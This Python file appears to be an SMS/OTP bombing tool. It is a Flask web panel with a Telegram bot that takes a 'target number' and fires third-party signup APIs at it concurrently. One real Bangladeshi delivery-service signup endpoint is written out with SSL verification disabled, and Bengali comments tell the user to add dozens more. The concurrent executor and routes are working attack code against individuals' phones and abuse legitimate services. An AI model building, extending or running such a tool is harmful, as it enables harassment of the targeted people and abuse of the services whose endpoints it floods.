import requests
import random
import string
import time
import json
import asyncio
import threading
import urllib3
import telebot
from flask import Flask, request, jsonify, render_template_string

# SSL Warning বন্ধ রাখা হলো
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ==================== 1. TELEGRAM BOT SETUP ====================
TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"

bot = None
if TELEGRAM_BOT_TOKEN and TELEGRAM_BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
    bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        bot.reply_to(message, "⚡ Cyber API Control Panel & Bot is active!")

    def run_telegram_bot():
        try:
            # 409 Conflict Error এড়ানোর জন্য পুরোনো ওয়েবহুক রিমুভ করা হচ্ছে
            bot.remove_webhook()
            print("Telegram Bot started successfully...")
            bot.infinity_polling(none_stop=True)
        except Exception as e:
            print("Telegram Bot Error:", e)


# ==================== 2. FUTURISTIC DARK UI ====================
UI_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER API CONTROL PANEL</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', 'Courier New', monospace; }
        body { 
            background: #080b10; 
            color: #00ffcc; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .container { 
            width: 100%; 
            max-width: 550px; 
            background: rgba(15, 23, 42, 0.85); 
            border: 1px solid #00ffcc; 
            border-radius: 12px; 
            padding: 25px; 
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
            backdrop-filter: blur(10px);
        }
        h2 { text-align: center; margin-bottom: 20px; color: #00ffcc; text-shadow: 0 0 10px #00ffcc; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; color: #94a3b8; font-weight: bold; }
        input[type="text"] { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #00ffcc; 
            border-radius: 6px; 
            background: #020617; 
            color: #00ffcc; 
            outline: none;
            font-size: 1rem;
        }
        input[type="text"]:focus { box-shadow: 0 0 10px rgba(0, 255, 204, 0.5); }
        .btn-container { display: flex; gap: 10px; margin-top: 15px; }
        button { 
            flex: 1; 
            padding: 12px; 
            border: none; 
            border-radius: 6px; 
            background: #00ffcc; 
            color: #020617; 
            font-weight: bold; 
            font-size: 0.95rem; 
            cursor: pointer; 
            transition: 0.2s; 
        }
        button:hover { background: #38bdf8; box-shadow: 0 0 12px #38bdf8; color: #fff; }
        button.secondary { background: #1e293b; color: #00ffcc; border: 1px solid #00ffcc; }
        button.secondary:hover { background: #00ffcc; color: #020617; }
        .result-box { 
            margin-top: 20px; 
            background: #020617; 
            border: 1px solid #334155; 
            border-radius: 6px; 
            padding: 15px; 
            max-height: 220px; 
            overflow-y: auto; 
            font-size: 0.85rem; 
            color: #38bdf8; 
            white-space: pre-wrap; 
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>⚡ CYBER CONTROL PANEL</h2>
        <div class="form-group">
            <label for="phone">> TARGET NUMBER:</label>
            <input type="text" id="phone" placeholder="017xxxxxxxx">
        </div>
        
        <div class="btn-container">
            <button onclick="runApis('all')">EXECUTE ALL APIs</button>
            <button class="secondary" onclick="runApis('selected')">RANGE (50-75)</button>
        </div>
        
        <div class="result-box" id="resultBox">System Online. Enter target number and initialize...</div>
    </div>

    <script>
        async function runApis(type) {
            const phone = document.getElementById('phone').value.trim();
            const resultBox = document.getElementById('resultBox');
            
            if (!phone) {
                alert("Please input phone number!");
                return;
            }

            resultBox.innerText = "[+] Running APIs concurrently... Please wait...";

            let endpoint = '/run-all';
            let bodyData = { phone: phone };

            if (type === 'selected') {
                endpoint = '/run';
                let apisList = [];
                for(let i = 50; i <= 75; i++) { apisList.push(i); }
                bodyData.apis = apisList;
            }

            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(bodyData)
                });
                const data = await response.json();
                resultBox.innerText = JSON.stringify(data, null, 2);
            } catch (err) {
                resultBox.innerText = "[-] Connection Error: Server unreachable.";
            }
        }
    </script>
</body>
</html>
"""


# ==================== 3. 75 APIs DEFINITION ====================
# তোমার কাছে থাকা call_api50 থেকে call_api75 পর্যন্ত ফাংশনগুলো এখানে বসাবে:
def call_api50(phone: str):
    url = "https://api.redx.com.bd:443/v1/user/signup"
    data = {"name": phone, "service": "redx", "phoneNumber": phone}
    resp = requests.post(url, json=data, headers={"Content-Type": "application/json"}, verify=False)
    resp.raise_for_status()

# ... বাকি call_api51 থেকে call_api75 ফাংশনগুলো এখানে পর পর লিখে যাবে ...


# APIS Dictionary (এখানে তোমার সব API নম্বর অনুযায়ী জোড়া দেবে)
apis = {
    50: call_api50,
    # 51: call_api51,
    # 52: call_api52,
    # ... 75 পর্যন্ত যুক্ত করবে ...
}


# ==================== 4. BACKEND EXECUTOR ====================
async def _run_apis_concurrently(phone: str, api_numbers: list[int]) -> list[dict]:
    loop = asyncio.get_running_loop()
    results: list[dict] = []

    def run_one(n: int, fn: callable) -> dict:
        try:
            fn(phone)
            return {"api": n, "status": "ok"}
        except Exception as exc:  
            return {"api": n, "status": "error", "error": str(exc)}

    tasks = [
        loop.run_in_executor(None, run_one, n, apis[n])
        for n in api_numbers
        if n in apis
    ]
    for result in await asyncio.gather(*tasks):
        results.append(result)
    return results


# ==================== 5. FLASK ROUTES ====================
@app.get("/")
def index():
    return render_template_string(UI_TEMPLATE)


@app.route("/run-all", methods=["GET", "POST"])
def http_run_all():
    if request.method == "GET":
        phone = (request.args.get("phone") or "").strip()
    else:
        body = request.get_json(silent=True) or {}
        phone = (body.get("phone") or "").strip()
    if not phone:
        return jsonify({"error": "phone is required"}), 400

    api_numbers = sorted(apis.keys())
    results = asyncio.run(_run_apis_concurrently(phone, api_numbers))
    return jsonify({"count": len(results), "results": results})


@app.route("/run", methods=["GET", "POST"])
def http_run_selected():
    if request.method == "GET":
        phone = (request.args.get("phone") or "").strip()
        apis_param = request.args.get("apis")
        requested = [p for p in apis_param.split(",") if p] if apis_param else None
    else:
        body = request.get_json(silent=True) or {}
        phone = (body.get("phone") or "").strip()
        requested = body.get("apis")
        
    if not phone:
        return jsonify({"error": "phone is required"}), 400

    if requested is None:
        api_numbers = sorted(apis.keys())
    else:
        try:
            api_numbers = [int(x) for x in requested]
        except Exception:  
            return jsonify({"error": "apis must be list of integers"}), 400

    results = asyncio.run(_run_apis_concurrently(phone, api_numbers))
    return jsonify({"count": len(results), "results": results})


if __name__ == "__main__":
    # টেলিগ্রাম বটকে ব্যাকগ্রাউন্ড থ্রেডে চালানো হচ্ছে
    if bot:
        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
        bot_thread.start()

    # ফ্লাস্ক অ্যাপ চালু করা
    app.run(host="0.0.0.0", port=5000, debug=False)
